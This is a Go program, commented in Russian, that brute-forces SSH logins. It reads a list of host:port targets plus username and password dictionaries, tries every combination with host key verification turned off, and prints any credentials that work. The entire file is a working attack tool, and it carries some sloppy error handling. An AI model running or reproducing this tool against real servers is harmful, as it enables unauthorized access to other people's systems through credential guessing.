package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// HostInfo - информация о хосте
type HostInfo struct {
	host   string
	port   string
	user   string
	pass   string
	isWeak bool
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Использование: %s IPList userDic passDic\n", os.Args[0])
		os.Exit(1)
	} else {
		iplist := os.Args[1]
		userDict := os.Args[2]
		passDict := os.Args[3]
		Scan(Prepare(iplist, userDict, passDict))
		os.Exit(0)
	}
}

// Prepare - подготовка к сканированию
func Prepare(iplist, userDict, passDict string) (sliceIPList, sliceUser, slicePass []string) {
	iplistFile, _ := os.Open(iplist)
	defer iplistFile.Close()
	scanner := bufio.NewScanner(iplistFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		sliceIPList = append(sliceIPList, scanner.Text())
	}

	userDictFile, _ := os.Open(userDict)
	defer userDictFile.Close()
	scannerU := bufio.NewScanner(userDictFile)
	scannerU.Split(bufio.ScanLines)
	for scannerU.Scan() {
		sliceUser = append(sliceUser, scannerU.Text())
	}

	passDictFile, _ := os.Open(passDict)
	defer passDictFile.Close()
	scannerP := bufio.NewScanner(passDictFile)
	scannerP.Split(bufio.ScanLines)
	for scannerP.Scan() {
		slicePass = append(slicePass, scannerP.Text())
	}

	return sliceIPList, sliceUser, slicePass
}

// Scan - сканирование
func Scan(sliceIPList, sliceUser, slicePass []string) {
	for _, hostPort := range sliceIPList {

		fmt.Printf("Try to crack %s\n", hostPort)
		t := strings.Split(hostPort, ":")
		host := t[0]
		port := t[1]

		for _, user := range sliceUser {
			for _, passwd := range slicePass {

				HostInfo := HostInfo{}
				HostInfo.host = host
				HostInfo.port = port
				HostInfo.user = user
				HostInfo.pass = passwd
				HostInfo.isWeak = false

				if Crack(HostInfo) {
					fmt.Printf("User: %s, Password: %s\n", HostInfo.user, HostInfo.pass)
				}
			}
		}
	}
}

// Crack - подбор пароля
func Crack(HostInfo HostInfo) bool {
	host := HostInfo.host
	port := HostInfo.port
	user := HostInfo.user
	passwd := HostInfo.pass
	isOk := HostInfo.isWeak

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		isOk = false
	} else {
		session, err := client.NewSession()
		defer session.Close()

		if err != nil {
			isOk = false
		} else {
			isOk = true

		}

	}

	return isOk
}
